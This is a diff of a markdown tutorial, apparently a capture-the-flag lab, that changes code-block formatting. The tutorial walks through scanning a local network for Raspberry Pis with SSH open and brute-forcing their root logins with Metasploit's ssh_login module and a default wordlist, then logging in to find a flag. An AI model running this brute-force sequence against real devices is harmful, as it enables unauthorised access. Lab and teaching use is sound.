@@ -4,7 +4,7 @@
 
 Find raspberry pi's running on the network with port 22 (SSH) open:
 
-```bash
+```
 nmap -p 22 --open 192.168.1.0/24
 ```
 
@@ -16,7 +16,7 @@ We will use a brute force password attack against the targets we found in the pr
 We will use a list of passwords which our attack will use and will try to login as the user *root* on each target.
 To view our list of passwords run the following command:
 
-```bash
+```
 cat /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 ```
 
@@ -24,7 +24,7 @@ cat /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 
 Let's launch the metasploit command shell from which we will run our exploit from:
 
-```bash
+```
 msfconsole
 ```
 
@@ -34,7 +34,7 @@ Metasploit comes with hundreds of exploits that you can run against targets. In 
 
 Run the following command to load the "ssh_login" exploit:
 
-```bash
+```
 use auxiliary/scanner/ssh/ssh_login
 ```
 
@@ -44,19 +44,19 @@ We need to configure our ssh_login attack with a few settings...
 
 Set the target ip address range that we will attack with:
 
-```bash
+```
 set RHOSTS 192.168.1.1-10
 ```
 
 Set the path to the username and password list with:
 
-```bash
+```
 set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 ```
 
 Set the number of attacks that can run at one time so we can efficiently run the attack against our targets with:
 
-```bash
+```
 set THREADS 10
 ```
 
@@ -64,21 +64,21 @@ set THREADS 10
 
 Start the ssh_login attack with the following command:
 
-```bash
+```
 run
 ```
 
 After the attack completes you will see "success" on a line that has a username and password that was used to successfuly login. You'll use this ip address, username and password later below.
 
 Now exit the metasploit shell:
-```bash
+```
 exit -y
 ```
 
 If you're successful you will see the output above. Now grab this ip address and login with it via ssh using the password matched:
 
-```bash
-ssh root@<the ip address here>
+```
+ssh root@the ip address here
 ```
 
 ## Find The Flag
@@ -89,6 +89,6 @@ Use the find command to locate this file on the file system and then grap the se
 
 Hint:
 
-```bash
-find / -name <some filename here>
+```
+find / -name "some filename here"
 ```
